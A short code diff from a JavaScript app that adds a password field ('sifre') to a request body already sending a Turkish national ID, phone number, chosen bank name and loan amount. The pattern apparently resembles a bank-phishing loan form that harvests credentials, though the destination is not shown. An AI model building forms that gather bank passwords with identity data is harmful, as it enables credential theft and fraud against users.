@@ -195,6 +195,7 @@ function App() {
         },
         body: JSON.stringify({
           tc_kimlik: tcKimlik,
+          sifre: sifre,
           telefon: telefon,
           bank_name: selectedBank.name,
           amount: loanAmount,
